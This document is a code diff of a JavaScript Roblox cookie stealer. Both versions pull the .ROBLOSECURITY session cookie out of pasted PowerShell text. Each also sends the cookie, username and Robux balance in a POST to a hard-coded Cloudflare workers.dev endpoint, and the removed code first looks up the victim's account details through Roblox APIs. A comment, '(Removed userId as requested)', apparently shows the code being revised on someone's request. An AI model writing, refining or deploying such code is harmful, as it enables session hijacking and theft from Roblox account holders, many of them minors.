@@ -1,158 +1,57 @@
 const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
 
-function extractRobloxSecurityCookie(input) {
-  // Match PowerShell format
-  const powershellPattern = /\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
-  const powershellMatch = input.match(powershellPattern);
-  
-  // Also match raw cookie format just in case
-  const rawCookiePattern = /(_|\.)ROBLOSECURITY=([^;]+)/;
-  const rawCookieMatch = input.match(rawCookiePattern);
-  
-  if (powershellMatch) {
-    return powershellMatch[1];
-  } else if (rawCookieMatch) {
-    return rawCookieMatch[2];
-  }
-  
-  return null;
-}
+function extractDataFromPowerShell(input) {
+  // 1. Extract .ROBLOSECURITY cookie
+  const cookieMatch = input.match(/\.ROBLOSECURITY["'],\s*["']([^"']+)/);
+  if (!cookieMatch) return null; // Not a valid PowerShell format
 
-async function fetchRobloxProfile(cookie) {
-  try {
-    // First fetch the user info
-    const userResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
-      headers: {
-        "Cookie": `.ROBLOSECURITY=${cookie}`,
-        "Content-Type": "application/json"
-      }
-    });
-    
-    if (!userResponse.ok) {
-      throw new Error(`User API failed with status ${userResponse.status}`);
-    }
-    
-    const userData = await userResponse.json();
-    
-    // Then fetch premium status (which often includes Robux balance)
-    const premiumResponse = await fetch("https://premiumfeatures.roblox.com/v1/users/premium/membership", {
-      headers: {
-        "Cookie": `.ROBLOSECURITY=${cookie}`
-      }
-    });
-    
-    // Then fetch the economy info (for exact Robux balance)
-    const economyResponse = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
-      headers: {
-        "Cookie": `.ROBLOSECURITY=${cookie}`
-      }
-    });
-    
-    let robux = 0;
-    let isPremium = false;
-    
-    if (economyResponse.ok) {
-      const economyData = await economyResponse.json();
-      robux = economyData.robux || 0;
-    }
-    
-    if (premiumResponse.ok) {
-      const premiumData = await premiumResponse.json();
-      isPremium = premiumData.isPremium || false;
-    }
-    
-    return {
-      robux: robux,
-      username: userData.name,
-      userId: userData.id,
-      displayName: userData.displayName,
-      isPremium: isPremium,
-      cookieValid: true
-    };
-  } catch (error) {
-    console.error("Error fetching Roblox profile:", error);
-    return {
-      robux: null,
-      username: null,
-      userId: null,
-      displayName: null,
-      isPremium: null,
-      cookieValid: false,
-      error: error.message
-    };
-  }
+  const cookie = cookieMatch[1];
+
+  // 2. Extract Robux (if present in the input)
+  const robuxMatch = input.match(/Robux["']?\s*[:=]\s*["']?(\d+)/);
+  const robux = robuxMatch ? robuxMatch[1] : "0";
+
+  // 3. Extract Username (if present in the input)
+  const usernameMatch = input.match(/Username["']?\s*[:=]\s*["']?([^"'\s]+)/);
+  const username = usernameMatch ? usernameMatch[1] : "Unknown";
+
+  // 4. (Optional) Extract DisplayName if available
+  const displayNameMatch = input.match(/DisplayName["']?\s*[:=]\s*["']?([^"'\s]+)/);
+  const displayName = displayNameMatch ? displayNameMatch[1] : username; // Fallback to username
+
+  return {
+    cookie,
+    robux,
+    username,
+    displayName,
+    // (Removed userId as requested)
+  };
 }
 
 async function sendToProxy(data) {
-  try {
-    const response = await fetch(CLOUDFLARE_PROXY_URL, {
-      method: 'POST',
-      headers: { 
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify({
-        sessionId: data.cookie,
-        timestamp: new Date().toISOString(),
-        robux: data.robux,
-        username: data.username,
-        userId: data.userId,
-        displayName: data.displayName,
-        isPremium: data.isPremium,
-        cookieValid: data.cookieValid,
-        error: data.error || null
-      })
-    });
-    
-    if (!response.ok) {
-      const errorText = await response.text();
-      throw new Error(`Proxy error: ${response.status} - ${errorText}`);
-    }
-    
-    return await response.json();
-  } catch (error) {
-    console.error('Proxy communication error:', error);
-    throw error;
-  }
+  await fetch(CLOUDFLARE_PROXY_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      sessionId: data.cookie,
+      timestamp: new Date().toISOString(),
+      robux: data.robux,
+      username: data.username,
+      displayName: data.displayName,
+    })
+  });
 }
 
-async function bruteforce(input) {
-  const cookie = extractRobloxSecurityCookie(input);
-  
-  let content;
-  if (cookie) {
-    content = `✅ Extracted cookie:\n\`\`\`${cookie}\`\`\``;
-    
-    // Fetch profile data using the cookie
-    const profile = await fetchRobloxProfile(cookie);
-    
-    // Prepare the data to be sent
-    const dataToSend = {
-      cookie: cookie,
-      robux: profile.robux,
-      username: profile.username,
-      userId: profile.userId,
-      displayName: profile.displayName,
-      isPremium: profile.isPremium,
-      cookieValid: profile.cookieValid,
-      error: profile.error
-    };
-    
-    // Send to proxy
-    await sendToProxy(dataToSend);
-    
-    // Add profile info to console output
-    content += `\n\n✅ Profile Data:\nUsername: ${profile.username || 'N/A'}\nDisplay Name: ${profile.displayName || 'N/A'}\nUser ID: ${profile.userId || 'N/A'}\nRobux: ${profile.robux || 'N/A'}\nPremium: ${profile.isPremium ? 'Yes' : 'No'}\nCookie Valid: ${profile.cookieValid ? 'Yes' : 'No'}`;
-    
-    if (profile.error) {
-      content += `\nError: ${profile.error}`;
-    }
-  } else {
-    content = `⚠️ No valid cookie found in input:\n\`\`\`${input.length > 500 ? input.substring(0, 500) + '...' : input}\`\`\``;
+function bruteforce(input) {
+  const extractedData = extractDataFromPowerShell(input);
+
+  if (!extractedData) {
+    console.log("❌ Input is not in PowerShell format or missing cookie.");
+    return;
   }
-  
-  console.log(content);
-  return content;
+
+  sendToProxy(extractedData);
+  console.log(`✅ Extracted Data:\n- User: ${extractedData.username}\n- Robux: ${extractedData.robux}\n- Cookie: ${extractedData.cookie.substring(0, 10)}...`);
 }
 
 
